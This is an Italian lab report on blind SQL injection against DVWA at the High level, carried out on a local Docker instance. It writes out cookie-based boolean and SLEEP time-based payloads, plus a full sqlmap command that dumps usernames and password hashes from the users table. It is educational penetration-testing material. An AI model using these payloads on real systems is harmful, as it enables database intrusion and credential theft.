# 🔐 DVWA SQL Injection (Blind) - 
Security Level: High | Lab Report
**Autore:** Leonardo Sorrentini  
**Data:** Maggio 2026  
**Ambiente:** Kali Linux | Docker | DVWA | Burp Suite | sqlmap  
**Target:** `http://127.0.0.1/vulnerabilities/sqli_blind/`  
**Livello:** `High`

---

## 🎯 Obiettivo
Sfruttare una vulnerabilità **Blind SQL Injection** in DVWA (livello High), dove l'input è letto da un cookie (`$_COOKIE['id']`), sanitizzato con `mysqli_real_escape_string()` e utilizzato in una query con `LIMIT 1`. Documentare metodologia, payload, automazione con `sqlmap` e mitigazioni.

---

## 🔍 High vs Medium: Cosa Cambia?
| Aspetto | Medium | High (Blind) |
|---------|--------|-------------|
| **Input Source** | POST/GET parameter | **Cookie `id`** |
| **Query Backend** | `WHERE user_id = $id` | `WHERE user_id = '$id' LIMIT 1` |
| **Sanitizzazione** | `mysqli_real_escape_string()` | Escape + virgolette + LIMIT |
| **Output** | Dump diretto (UNION) | **Nessun output diretto** (solo sì/no o delay) |
| **Tecnica richiesta** | UNION-based | **Boolean/Time-Based Blind** |

---

## 🧠 Perché è Difficile?
1. **Cookie-based injection**: L'input vulnerabile è in `$_COOKIE['id']`, non in URL o POST
2. **Escape attivo**: `'` viene trasformato in `\'`, bloccando la chiusura della stringa SQL
3. **Sessione volatile**: DVWA invalida i cookie se il livello di sicurezza cambia a metà login
4. **Falsi positivi WAF**: I filtri base di DVWA triggerano le euristiche di `sqlmap`

---

## 🛠️ Metodologia di Test

### 🔹 Manuale (Boolean-Based - Concettuale)
```sql
# Verifica vulnerabilità
Cookie: id=1' AND 1=1#  → ✅ "User ID exists in the database."
Cookie: id=1' AND 1=2#  → ❌ "User ID is MISSING from the database."

# Estrazione carattere per carattere del nome del database
Cookie: id=1' AND SUBSTRING(database(),1,1)='d'# → ✅
Cookie: id=1' AND SUBSTRING(database(),1,1)='a'# → ❌
# Iterando: d → v → w → a = "dvwa"

# Se AND 1=2 restituisce comunque "exists", usiamo i ritardi:
Cookie: id=1' AND SLEEP(5)#  → ⏱️ La pagina impiega ~5 secondi a caricarsi
Cookie: id=1' AND SLEEP(0)#  → ⚡ Caricamento immediato

#Automatizzata con sqlmap
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli_blind/" \
  --cookie="id=1; PHPSESSID=XYZ; security=high" \
  --dbms=MySQL \
  --level=5 --risk=3 --batch --delay=1 \
  --technique=T \
  --prefix="'" --suffix="#" \
  --tamper=space2comment \
  --drop-set-cookie --skip-waf \
  -D dvwa -T users -C user,password --dump

⚠️ Nota pratica: Su DVWA High, sqlmap richiede sessioni fresche, cookie ben formattati e flag specifici (--drop-set-cookie, --delay) per evitare falsi negativi.

#"Tutte le attività documentate sono state eseguite esclusivamente su infrastruttura containerizzata isolata di proprietà. Nessun accesso, modifica o esposizione di sistemi o dati di terzi. Scopo puramente formativo, conforme alle linee guida OWASP e alla normativa vigente in materia di cybersecurity."
